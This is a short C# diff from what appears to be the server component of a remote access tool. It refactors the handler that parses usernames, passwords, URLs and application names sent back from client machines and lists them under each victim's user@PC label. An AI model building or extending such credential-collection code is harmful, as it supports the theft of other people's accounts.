@@ -1,8 +1,9 @@
 using System;
-using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Threading;
 using System.Windows.Forms;
+using xServer.Core.Data;
 using xServer.Core.Networking;
 using xServer.Core.Packets.ClientPackets;
 using xServer.Core.Packets.ServerPackets;
@@ -23,20 +24,21 @@ namespace xServer.Core.Commands
 
             string userAtPc = string.Format("{0}@{1}", client.Value.Username, client.Value.PCName);
 
-            List<LoginInfo> lst = new List<LoginInfo>();
+            var lst =
+                packet.Passwords.Select(str => str.Split(new[] {DELIMITER}, StringSplitOptions.None))
+                    .Select(
+                        values =>
+                            new RecoveredAccount
+                            {
+                                Username = values[0],
+                                Password = values[1],
+                                URL = values[2],
+                                Application = values[3]
+                            })
+                    .ToList();
 
-            foreach (string str in packet.Passwords)
-            {
-                // raw passworddata
-                string[] values = str.Split(new string[] { DELIMITER }, StringSplitOptions.None);
-                lst.Add(new LoginInfo() { Username = values[0], Password = values[1], URL = values[2], Application = values[3] });
-            }
-
-            foreach (LoginInfo login in lst)
-            {
-                // add them to the listview of frmpass
-                client.Value.FrmPass.AddPassword(login, userAtPc);
-            }
+            if (client.Value != null && client.Value.FrmPass != null)
+                client.Value.FrmPass.AddPasswords(lst.ToArray(), userAtPc);
         }
         public static void HandleGetDesktopResponse(Client client, GetDesktopResponse packet)
         {
